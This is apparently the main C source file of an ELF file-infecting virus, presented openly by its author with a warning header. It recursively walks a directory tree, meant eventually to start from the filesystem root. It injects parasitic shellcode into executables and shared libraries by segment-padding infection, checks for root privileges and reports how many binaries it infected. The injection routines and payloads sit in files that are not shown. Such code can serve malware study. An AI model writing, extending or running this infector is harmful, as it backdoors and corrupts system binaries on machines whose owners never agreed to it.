/*

Author : Abhinav Thakur
Email  : compilepeace@gmail.com


Warning : You may not want to run the compiled binary on your host machine as it may lead to 
          corruption or backdooring of all utility programs provided by the distribution and
          eventually leave your system in an entirely unstable/unusable state. Consider 
		  running it into a sandboxed environment or make good use of Virualization platforms.


Description : This program parses all the directories and subdirectories under the path provided
			  by user as a command-line argument and causes infection by injecting parasitic code
			  into binaries following a segment padding infection technique.
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "operations.h"
#include "color.h"

#define ROOTNODE "/"



char *parasite_path_for_exec;
char *parasite_path_for_so;
int  INFECT_DIRS;

int main(int argc, char *argv[])
{

	// Check for command line arguments
	if (argc < 2)
	{
		fprintf(stderr, RED"[-]"YELLOW" Usage"RESET":"BLUE" %s <INFECTION_DIR> <PATH_TO_PARASITE>\n", argv[0]);
		exit(0x10);
	}	

	
	// Using different parasites (for LSB executable and LSB Shared object infection)
	// parasite_path_for_exec = argv[2];
	// parasite_path_for_so   = argv[3];
	parasite_path_for_exec  = "./shellcode/exec_parasite.bin";
	parasite_path_for_so	= "./shellcode/so_parasite.bin";
	infected_count = 0;


	// Get the real and effective user IDs and check if user has root priveleges
	uid_t uid = getuid();
	uid_t euid = geteuid();
	if (uid == 0 || euid == 0)
		fprintf(stdout, GREEN"\n[+] "RESET"Running as root : %d : %d ...\n", uid, euid);
	else
		fprintf(stdout, RED"\n[-] "RESET"Running as %s ...\n", getenv("USERNAME"));


    char *path = argv[1];         // Replace it with ROOTNODE when done developing


	// Start reccusing directories and get a linkedlist pointed to by *head, storing the filenames and
	// file attributes under the path provided by user (as a command line arg)
	DirEntriesParse(path);

	//PrintLinkedList(head);

	if (INFECT_DIRS) Destroy(head);

	fprintf(stdout, "\n\n\n");
	fprintf(stdout, BOLDGREEN"[+]"RESET" Total Directories  Parsed   : %ld\n", dir_count);
	fprintf(stdout, BOLDGREEN"[+]"RESET" Total files        Parsed   : %ld\n", file_count);
	fprintf(stdout, BOLDGREEN"[+]"RESET" Total ELFs         Parsed   : %ld\n", elf_count);
	fprintf(stdout, BOLDCYAN"[+]"RESET" Total Binaries     Infected : %d \n", infected_count); 
	

return 0x00;
}

